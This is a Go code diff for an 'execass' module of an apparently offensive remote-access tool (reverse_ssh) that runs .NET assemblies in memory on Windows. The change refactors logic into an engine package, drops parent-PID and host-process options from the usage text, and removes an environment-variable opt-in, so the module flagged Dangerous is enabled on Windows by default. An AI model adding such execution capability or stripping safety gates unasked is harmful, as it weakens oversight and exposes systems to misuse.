@@ -5,10 +5,10 @@ package execass
 import (
 	"context"
 	"fmt"
-	"os"
 	"runtime"
 
 	"github.com/NHAS/reverse_ssh/internal/client/handlers/subsystems"
+	"github.com/NHAS/reverse_ssh/internal/client/handlers/subsystems/execass/engine"
 )
 
 type Module struct{}
@@ -22,22 +22,22 @@ func (m *Module) Manifest() subsystems.Manifest {
 		Name:        "execass",
 		Description: "Windows-only .NET execution-assist interface.",
 		Version:     "1",
-		Usage:       "execass (--artifact <path> | --stdin) [--sha256 <digest>] [--in-process --runtime v4 | --process notepad.exe --process-args '<args>' --ppid <pid>] [--args '<assembly args>'] [--timeout 30s] [--output-limit bytes]",
+		Usage:       "execass (--artifact <path> | --stdin) [--sha256 <digest>] [--in-process --runtime v4] [--args '<assembly args>'] [--timeout 30s] [--output-limit bytes]",
 		BuildTags:   []string{"execass"},
 		Platforms:   []string{"windows"},
 		Dangerous:   true,
-		Disabled:    runtime.GOOS == "windows" && !enabledByEnv(),
+		Disabled:    runtime.GOOS != "windows",
 		Limits: subsystems.ModuleLimits{
-			TimeoutSeconds: int(MaxTimeout.Seconds()),
-			OutputBytes:    DefaultOutputBytes,
-			StdinBytes:     MaxArtifactBytes,
+			TimeoutSeconds: int(engine.MaxTimeout.Seconds()),
+			OutputBytes:    engine.DefaultOutputBytes,
+			StdinBytes:     engine.MaxArtifactBytes,
 			MaxArgs:        10,
 		},
 	}
 }
 
 func (m *Module) Run(ctx context.Context, io subsystems.ModuleIO, args []string) error {
-	request, err := ParseRequest(args)
+	request, err := engine.ParseRequest(args)
 	if err != nil {
 		return err
 	}
@@ -53,9 +53,5 @@ func (m *Module) Run(ctx context.Context, io subsystems.ModuleIO, args []string)
 		return fmt.Errorf("artifact is empty")
 	}
 
-	return newRunner().Run(ctx, request, io)
-}
-
-func enabledByEnv() bool {
-	return os.Getenv("WRSSH_ENABLE_EXECASS") == "1" || os.Getenv("WRSSH_EXECASS_ENABLE") == "1"
+	return engine.NewRunner().Run(ctx, request, io)
 }
